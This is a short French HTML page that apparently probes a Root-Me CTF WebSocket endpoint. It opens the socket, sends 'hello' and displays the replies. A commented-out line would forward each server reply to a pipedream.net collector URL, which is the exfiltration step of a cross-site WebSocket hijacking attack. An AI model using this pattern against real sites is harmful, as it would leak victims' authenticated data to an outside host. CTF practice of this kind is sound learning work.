<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Exploration WebSocket</title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>
<body>
    <h1>Exploration WebSocket</h1>
    <pre id="chatbox"></pre>

    <script>
        $(function () {
            var chatbox = $('#chatbox');
            var wsUrl = 'ws://ctf06.root-me.org/ws'; 
            var connection = new WebSocket(wsUrl);

            connection.onopen = function () {
                chatbox.append("Connecté au WebSocket.\n");

                // Envoi automatique de messages
                setTimeout(function() {
                    sendMessage("hello");
                }, 1000); // Envoi après 1 seconde pour s'assurer que la connexion est établie
            };

            connection.onerror = function (error) {
                chatbox.append("Erreur : " + error.message + "\n");
            };

            connection.onmessage = function (message) {
                chatbox.append("Réponse du serveur : " + message.data + "\n");

                // Redirection en fonction de la réponse du serveur
                
                    //window.location.href = "https://eom247ee5g67aog.m.pipedream.net/" + message.data;
            
            };

            connection.onclose = function () {
                chatbox.append("Déconnecté du WebSocket.\n");
            };

            function sendMessage(msg) {
                if (msg) {
                    connection.send(msg);
                    chatbox.append("Vous : " + msg + "\n");
                }
            }
        });
    </script>
</body>
</html>
